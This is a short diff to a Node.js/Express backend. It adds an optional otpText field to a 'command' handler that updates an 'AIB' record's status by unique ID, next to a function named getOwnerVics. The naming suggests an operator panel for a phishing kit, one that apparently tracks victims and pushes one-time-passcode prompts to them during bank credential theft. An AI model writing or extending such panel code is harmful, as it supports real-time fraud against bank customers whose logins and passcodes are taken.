@@ -13,9 +13,13 @@ const getOwnerVics = async (req, res) => {
 };
 
 const command = async (req, res) => {
-  const { uniqueid, status } = req.body;
+  const { uniqueid, status, otpText } = req.body;
   try {
-    await AIB.findOneAndUpdate({ uniqueid }, { status }).exec();
+    if (otpText) {
+      await AIB.findOneAndUpdate({ uniqueid }, { status, otpText }).exec();
+    } else {
+      await AIB.findOneAndUpdate({ uniqueid }, { status }).exec();
+    }
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
